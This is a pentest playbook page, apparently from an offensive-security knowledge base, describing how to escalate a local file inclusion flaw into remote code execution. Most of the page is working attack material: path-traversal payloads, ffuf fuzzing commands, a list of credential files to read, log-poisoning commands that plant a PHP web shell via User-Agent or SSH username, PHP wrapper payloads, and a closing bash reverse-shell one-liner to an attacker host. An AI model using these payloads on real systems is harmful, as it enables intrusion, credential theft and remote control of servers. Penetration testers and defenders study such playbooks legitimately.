---
id: lfi-rce
title: LFI → RCE
stage: initial-access
tags: [linux, web]
summary: Read arbitrary files through a vulnerable include parameter — then escalate to RCE by poisoning log files or abusing PHP wrappers.
leads_to:
  - rev-shell
---

## Prerequisites

A file include parameter (`?page=`, `?file=`, `?view=`) that reflects content from disk. The web server process must be able to read the target file — check for errors vs. empty response to distinguish "file not found" from "permission denied".

LFI lets you read any file the web process can access — `/etc/passwd`, SSH private keys, application configs with hardcoded credentials. The real prize is RCE: if you can write to a log file and read it back, you can inject PHP and execute commands. Log poisoning is the most reliable path; PHP wrappers are a fallback when logs aren't readable.

## Quick Win

> Test with `/etc/passwd` first — if you see UIDs, you have LFI. Then hunt for sensitive files.

```
?page=../../etc/passwd
?file=../../../../etc/passwd
?view=../../../../windows/win.ini
```

## LFI Fuzzing

> Fuzz both the parameter name and the traversal depth — wordlists handle both.

```bash
# Fuzz the parameter value (traversal paths as wordlist)
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -u "http://$TARGET/page.php?file=FUZZ" -fs 0

# Fuzz the parameter name (keep path fixed)
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "http://$TARGET/page.php?FUZZ=../../../../etc/passwd" -fs 0
```

## Sensitive Files to Read

> SSH keys, shadow, and app configs are the high-value targets after confirming LFI.

```
/root/.ssh/id_rsa
/home/$USER/.ssh/id_rsa
/etc/shadow
/var/www/html/config.php
/var/www/html/.env
```

## Log Poisoning (Apache)

> Inject PHP into the access log, then trigger it through the LFI — gives you command exec.

```bash
# 1. Confirm log read
?file=../../../../var/log/apache2/access.log

# 2. Poison the log with PHP in User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://$TARGET/

# 3. Trigger execution via LFI
?file=../../../../var/log/apache2/access.log&cmd=id
```

## Log Poisoning (SSH auth.log)

> SSH accepts any string as a username — inject PHP there if port 22 is open.

```bash
# Send PHP payload as SSH username
ssh "<?php system(\$_GET['cmd']); ?>"@$TARGET

# Trigger via LFI
?file=../../../../var/log/auth.log&cmd=id
```

## PHP Wrappers

> `php://filter` reads source code; `data://` executes arbitrary PHP when allow_url_include is on.

```
# Read source (base64-encoded to avoid PHP execution)
?file=php://filter/convert.base64-encode/resource=index.php

# RCE via data wrapper (requires allow_url_include = On)
?file=data://text/plain,<?php system('id'); ?>
?file=expect://id
```

## Leads To

`/etc/shadow` readable → crack hashes offline. SSH private key found → `ssh -i id_rsa user@$TARGET`. Log poisoning RCE confirmed → swap `id` for a reverse shell one-liner (`bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'`) → rev-shell. PHP `data://` wrapper → direct command execution → rev-shell.
